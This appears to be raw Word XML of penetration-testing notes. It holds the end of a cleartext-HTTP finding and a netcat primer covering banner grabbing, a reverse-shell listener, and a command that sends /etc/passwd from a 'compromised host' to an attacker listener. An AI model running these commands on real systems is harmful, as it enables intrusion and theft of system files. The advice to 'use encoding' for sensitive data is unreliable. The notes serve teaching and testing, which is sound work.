          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Impact: </w:t>
      </w:r>
      <w:r w:rsidR="00936618">
        <w:t xml:space="preserve">Cleartext communication opens </w:t>
      </w:r>
      <w:r w:rsidR="00584B69">
        <w:t xml:space="preserve">door to </w:t>
      </w:r>
      <w:r w:rsidR="00936618">
        <w:t xml:space="preserve">many </w:t>
      </w:r>
      <w:r w:rsidR="00584B69">
        <w:t>attacks such MITM, Session hijacking, etc.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BA25B9D" w14:textId="33F2ACE9" w:rsidR="0024213C" w:rsidRDefault="0024213C" w:rsidP="00936618">
      <w:pPr>
        <w:ind w:left="1440"/>
      </w:pPr>
      <w:r w:rsidRPr="004A78BB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Vulnerability Description:</w:t>
      </w:r>
      <w:r w:rsidRPr="0097283A">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00584B69">
        <w:t>An attacker can perform MITM to steal user credentials, session cookies and personal information, etc.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FE0261B" w14:textId="67014E91" w:rsidR="00802A84" w:rsidRDefault="00802A84" w:rsidP="00936618">
      <w:pPr>
        <w:ind w:left="1440"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Remediation:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="382FFD9F" w14:textId="32C3066E" w:rsidR="00802A84" w:rsidRDefault="00802A84" w:rsidP="00802A84">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Use HTTPs instead of HTTP.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65B1FC1B" w14:textId="65B1F993" w:rsidR="00802A84" w:rsidRDefault="00802A84" w:rsidP="00802A84">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="17"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Use encoding to transfer sensitive information.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77C06D04" w14:textId="2BA220FF" w:rsidR="00802A84" w:rsidRDefault="00802A84" w:rsidP="00802A84">
      <w:pPr>
        <w:ind w:left="2160"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="05D8A53E" w14:textId="77777777" w:rsidR="00212A97" w:rsidRPr="00936618" w:rsidRDefault="00212A97" w:rsidP="00802A84">
      <w:pPr>
        <w:ind w:left="2160"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="08C2E5EA" w14:textId="6C286B87" w:rsidR="0024213C" w:rsidRPr="00802A84" w:rsidRDefault="00802A84" w:rsidP="00802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Netcat:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A570080" w14:textId="77777777" w:rsidR="000910C7" w:rsidRDefault="00802A84">
      <w:r>
        <w:t>Netcat is small in size, and very powerful along with useful utility in everyday life.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11CF146A" w14:textId="06BAFADB" w:rsidR="00804706" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00802A84">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="68CDB443" wp14:editId="493A2DB6">
            <wp:extent cx="5486400" cy="2667000"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="119040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8381" name="Picture 11904083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5A8E" w14:textId="4C2B0A0B" w:rsidR="000910C7" w:rsidRDefault="000910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Cases:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0159367F" w14:textId="704A34D4" w:rsidR="000910C7" w:rsidRDefault="000910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#1 – Version identification</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69D9A013" w14:textId="7A9AAE5A" w:rsidR="000910C7" w:rsidRPr="000910C7" w:rsidRDefault="000910C7" w:rsidP="000910C7">
      <w:pPr>
        <w:ind w:left="1440"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000910C7">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Sometime nmap is unable to identify version of a software running on a port, so in that case, netcat is useful to identify software version.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BA114FA" w14:textId="4D00791E" w:rsidR="000910C7" w:rsidRDefault="000910C7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Command: </w:t>
      </w:r>
      <w:r w:rsidRPr="00212A97">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:bdr w:val="single" w:sz="4" w:space="0" w:color="auto"/>
          <w:shd w:val="pct10" w:color="auto" w:fill="auto"/>
        </w:rPr>
        <w:t>nc 192.168.10.54 80 -v</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="263350BD" w14:textId="77777777" w:rsidR="00212A97" w:rsidRDefault="00212A97">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="35260819" w14:textId="07CF6692" w:rsidR="000910C7" w:rsidRDefault="000910C7" w:rsidP="000910C7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#1 – </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Reverse shell</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F116C78" w14:textId="5575BCD7" w:rsidR="000910C7" w:rsidRPr="000910C7" w:rsidRDefault="000910C7" w:rsidP="000910C7">
      <w:pPr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t>Every hacker uses netcat for reverse shell connection because of two reasons, it is easy to use and setup</w:t>
      </w:r>
      <w:r w:rsidRPr="000910C7">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A7AF2B7" w14:textId="7D4904E7" w:rsidR="000910C7" w:rsidRDefault="000910C7" w:rsidP="000910C7">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:bdr w:val="single" w:sz="4" w:space="0" w:color="auto"/>
          <w:shd w:val="pct10" w:color="auto" w:fill="auto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Command: </w:t>
      </w:r>
      <w:r w:rsidRPr="000910C7">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:bdr w:val="single" w:sz="4" w:space="0" w:color="auto"/>
          <w:shd w:val="pct10" w:color="auto" w:fill="auto"/>
        </w:rPr>
        <w:t xml:space="preserve">nc </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:bdr w:val="single" w:sz="4" w:space="0" w:color="auto"/>
          <w:shd w:val="pct10" w:color="auto" w:fill="auto"/>
        </w:rPr>
        <w:t>-lvnp 8080</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="754E041B" w14:textId="77777777" w:rsidR="00212A97" w:rsidRPr="00584B69" w:rsidRDefault="00212A97" w:rsidP="000910C7">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0BBC1AC6" w14:textId="3A8773C2" w:rsidR="000910C7" w:rsidRDefault="000910C7" w:rsidP="000910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#1 – </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>File transfer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A5BE64F" w14:textId="444C019F" w:rsidR="000910C7" w:rsidRPr="000910C7" w:rsidRDefault="000910C7" w:rsidP="000910C7">
      <w:pPr>
        <w:ind w:left="1440"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Apart from version detection or reverse shell, netcat can send file and receive file across different systems.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66AAEF4D" w14:textId="12158575" w:rsidR="000910C7" w:rsidRDefault="000910C7" w:rsidP="000910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On compromised host: </w:t>
      </w:r>
      <w:r w:rsidR="00212A97" w:rsidRPr="00212A97">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:bdr w:val="single" w:sz="4" w:space="0" w:color="auto"/>
          <w:shd w:val="pct10" w:color="auto" w:fill="auto"/>
        </w:rPr>
        <w:t>nc 192.168.10.54 8080 &lt; /etc/passwd</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="429F505F" w14:textId="066162A0" w:rsidR="000910C7" w:rsidRPr="00584B69" w:rsidRDefault="000910C7" w:rsidP="000910C7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 attacker host</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidRPr="000910C7">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:bdr w:val="single" w:sz="4" w:space="0" w:color="auto"/>
          <w:shd w:val="pct10" w:color="auto" w:fill="auto"/>
        </w:rPr>
        <w:t xml:space="preserve">nc </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:bdr w:val="single" w:sz="4" w:space="0" w:color="auto"/>
          <w:shd w:val="pct10" w:color="auto" w:fill="auto"/>
        </w:rPr>
        <w:t>-lvnp 8080 &gt; pass.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79AEB392" w14:textId="74DB2706" w:rsidR="000910C7" w:rsidRPr="00584B69" w:rsidRDefault="000910C7">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:sectPr w:rsidR="000910C7" w:rsidRPr="00584B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E677B"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="A8880A94"/>
    <w:lvl w:ilvl="0" w:tplc="D88E599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04997F70"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="F782D2A0"/>
    <w:lvl w:ilvl="0" w:tplc="A92ED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136A6B"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="D3C48F70"/>
    <w:lvl w:ilvl="0" w:tplc="C98C7A0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87D6CB6"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="400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B5002"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="829284BC"/>
    <w:lvl w:ilvl="0" w:tplc="2ADC982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C172A28"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="C9BA87D4"/>
    <w:lvl w:ilvl="0" w:tplc="8D7E8FA2">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%1."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="25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F135E5E"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="E4761CA6"/>
    <w:lvl w:ilvl="0" w:tplc="49EC7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C616E5"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="8C422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373717">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="792670878">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="2111007432">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="1143350787">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="2026057359">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="177500511">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="1636376625">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="392892013">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="65610643">
    <w:abstractNumId w:val="0"/>
  </w:num>
  <w:num w:numId="10" w16cid:durableId="46881346">
    <w:abstractNumId w:val="10"/>
  </w:num>
  <w:num w:numId="11" w16cid:durableId="792478336">
    <w:abstractNumId w:val="12"/>
  </w:num>
  <w:num w:numId="12" w16cid:durableId="435711088">
    <w:abstractNumId w:val="16"/>
  </w:num>
  <w:num w:numId="13" w16cid:durableId="456410396">
    <w:abstractNumId w:val="15"/>
  </w:num>
  <w:num w:numId="14" w16cid:durableId="1561405038">
    <w:abstractNumId w:val="13"/>
  </w:num>
  <w:num w:numId="15" w16cid:durableId="536626566">
    <w:abstractNumId w:val="11"/>
  </w:num>
  <w:num w:numId="16" w16cid:durableId="1451902668">
    <w:abstractNumId w:val="14"/>
  </w:num>
  <w:num w:numId="17" w16cid:durableId="5555562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0C7"/>
    <w:rsid w:val="0015074B"/>
    <w:rsid w:val="001F51A8"/>
    <w:rsid w:val="00212A97"/>
    <w:rsid w:val="0024213C"/>
    <w:rsid w:val="0029639D"/>
    <w:rsid w:val="00326F90"/>
    <w:rsid w:val="003A1436"/>
    <w:rsid w:val="003B1C1A"/>
    <w:rsid w:val="0050570D"/>
    <w:rsid w:val="00584B69"/>
    <w:rsid w:val="005917B2"/>
    <w:rsid w:val="00754D7B"/>
    <w:rsid w:val="007B19C4"/>
    <w:rsid w:val="00802A84"/>
    <w:rsid w:val="00804706"/>
    <w:rsid w:val="008F0AAF"/>
    <w:rsid w:val="00927D53"/>
    <w:rsid w:val="00936618"/>
    <w:rsid w:val="009D4395"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00BB65F6"/>
    <w:rsid w:val="00C0068A"/>
    <w:rsid w:val="00C12308"/>
    <w:rsid w:val="00C40944"/>
    <w:rsid w:val="00CB0664"/>
    <w:rsid w:val="00DF1904"/>
    <w:rsid w:val="00E91154"/>
    <w:rsid w:val="00F323E3"/>
    <w:rsid w:val="00F50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B0F5A"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{1A8D6EBE-513E-497F-852B-65968974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0B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4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‎</cp:lastModifiedBy>
  <cp:revision>8</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2024-11-08T13:07:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2024-11-24T01:33:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>